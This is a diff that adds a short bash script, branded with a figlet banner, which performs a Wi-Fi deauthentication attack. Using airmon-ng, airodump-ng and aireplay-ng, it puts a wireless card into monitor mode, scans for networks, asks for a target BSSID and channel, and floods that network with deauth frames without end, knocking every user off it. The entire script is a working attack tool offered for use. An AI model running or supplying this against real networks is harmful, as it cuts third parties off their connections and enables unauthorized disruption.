@@ -1,0 +1,34 @@
+#!/bin/bash
+
+# This will deauthenticate all users from a network for as long as you keep it open.
+
+# Some fancy text
+
+echo mold8van | figlet -f smslant
+echo ""
+
+# launch airmon-ng attack
+
+
+echo Starting wlan0 interface...
+echo ""
+sudo airmon-ng start wlan0
+
+echo Killing stuff...
+echo ""
+sudo airmon-ng check kill
+
+echo Please wait 10s for a network scan...
+echo ""
+sudo airodump-ng wlan0mon
+
+echo Select the BSSID to deauth...
+read bssid
+echo Select the channel of the network...
+read channel
+
+sudo airodump-ng -c $channel --bssid $bssid wlan0mon
+
+echo Deauthing...Press CTRL+C to cancel...
+echo ""
+sudo aireplay-ng -0 0 -a $bssid wlan0mon
